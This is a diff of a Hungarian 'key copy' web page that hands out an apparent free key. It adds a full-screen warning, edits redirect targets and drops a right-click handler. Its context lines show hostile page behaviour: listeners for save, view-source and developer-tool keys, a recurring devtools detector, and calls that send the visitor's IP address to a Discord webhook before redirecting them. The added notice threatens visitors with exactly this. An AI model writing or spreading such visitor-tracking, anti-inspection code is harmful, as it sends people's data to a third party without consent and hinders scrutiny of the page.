@@ -5,8 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kulcs másoló weboldal</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Központban megjelenő értesítés */
+        #notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 18px;
+            text-align: center;
+            display: none;
+            z-index: 9999;
+        }
+
+        /* Homályos háttér */
+        #backgroundOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: 9998;
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <div id="backgroundOverlay"></div> <!-- Homályos háttér -->
+
     <div class="container">
         <img src="https://cdn.discordapp.com/attachments/1127157742046543892/1400523086889226331/vip.png?ex=688cf244&is=688ba0c4&hm=671b4f7e8daa147678d2196c7908597af93023a468700110aa10fdaa5a69da29&" alt="VIP" class="icon">
         <h1>Kattints a kulcs másolásához!</h1>
@@ -14,7 +45,13 @@
             <input type="text" value="N3N-FREE-GWERR-GBFKIU-UTFCF-VHYTRE-WTF" readonly id="keyInput">
             <button onclick="copyKey()">Másolás</button>
         </div>
-        <div class="notification" id="notification">A kulcs sikeresen kimásolva!</div>
+        <div class="notification" id="notification">
+            Ne használj tiltott billentyűkombinációkat, például:
+            <br><br>
+            Ctrl + S, Ctrl + U, F12, Ctrl + Shift + I.
+            <br><br>
+            Ha használod, az IP-címed automatikusan elküldésre kerül a Discord szerverre!
+        </div>
     </div>
 
     <script>
@@ -45,6 +82,7 @@
 
             // Fejlesztői eszközök érzékelése
             detectDevTools();
+            showNotification();  // Értesítés megjelenítése
         };
 
         // Másolja a kulcsot a vágólapra
@@ -78,34 +116,39 @@
             }, 1000); // Minden másodpercben ellenőrzi
         }
 
+        // Értesítés megjelenítése a képernyő közepén
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            const overlay = document.getElementById('backgroundOverlay');
+            notification.style.display = 'block';
+            overlay.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+                overlay.style.display = 'none';
+            }, 10000);  // 10 másodpercig látszik
+        }
+
         // Figyeljük a Ctrl + S billentyűkombinációt, és megakadályozzuk a weboldal mentését
         document.addEventListener('keydown', function(event) {
             if (event.ctrlKey && event.key === 's') {
                 event.preventDefault(); // Megakadályozza a mentést
                 sendIpRequest('Ctrl + S', altWebhookUrl);  // Második webhook küldése
-                window.location.href = "https://cdn.discordapp.com/attachments/1158512683998511235/1400563793196482762/522391358_2117753948735836_2653110483455839868_n.png?ex=688d182d&is=688bc6ad&hm=358c6238033f6112fb8e78a1ef58a4f4486d2bd9e3014e9ff0c47d4a134178d2&"; // Átirányítja egy másik oldalra
+                window.location.href = "https://example.com"; // Átirányítja egy másik oldalra
             }
 
             // Figyeljük, ha a felhasználó megpróbálja megnyitni a fejlesztői eszközöket
             if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
                 event.preventDefault(); // Megakadályozza a devtools megnyitását
                 sendIpRequest('F12 / Ctrl + Shift + I', altWebhookUrl);  // Második webhook küldése
-                window.location.href = "https://cdn.discordapp.com/attachments/1158512683998511235/1400563793196482762/522391358_2117753948735836_2653110483455839868_n.png?ex=688d182d&is=688bc6ad&hm=358c6238033f6112fb8e78a1ef58a4f4486d2bd9e3014e9ff0c47d4a134178d2&"; // Átirányítja egy másik oldalra
+                window.location.href = "https://example.com"; // Átirányítja egy másik oldalra
             }
 
             // Figyeljük a Ctrl + U kombinációt (forráskód megtekintése)
             if (event.ctrlKey && event.key === 'u') {
                 event.preventDefault(); // Megakadályozza a forráskód megnyitását
                 sendIpRequest('Ctrl + U', altWebhookUrl);  // Második webhook küldése
-                window.location.href = "https://cdn.discordapp.com/attachments/1158512683998511235/1400563793196482762/522391358_2117753948735836_2653110483455839868_n.png?ex=688d182d&is=688bc6ad&hm=358c6238033f6112fb8e78a1ef58a4f4486d2bd9e3014e9ff0c47d4a134178d2&"; // Átirányítja egy másik oldalra
+                window.location.href = "https://example.com"; // Átirányítja egy másik oldalra
             }
-        });
-
-        // Figyeljük a jobb klikket, hogy elkerüljük a képernyő mentését
-        document.addEventListener('contextmenu', function(event) {
-            event.preventDefault(); // Megakadályozza a jobb klikk menüt
-            sendIpRequest('Jobb klikk', altWebhookUrl);  // Második webhook küldése
-            window.location.href = "https://cdn.discordapp.com/attachments/1158512683998511235/1400563793196482762/522391358_2117753948735836_2653110483455839868_n.png?ex=688d182d&is=688bc6ad&hm=358c6238033f6112fb8e78a1ef58a4f4486d2bd9e3014e9ff0c47d4a134178d2&"; // Átirányítja egy másik oldalra
         });
 
         // IP küldése a /send-ip útvonalra
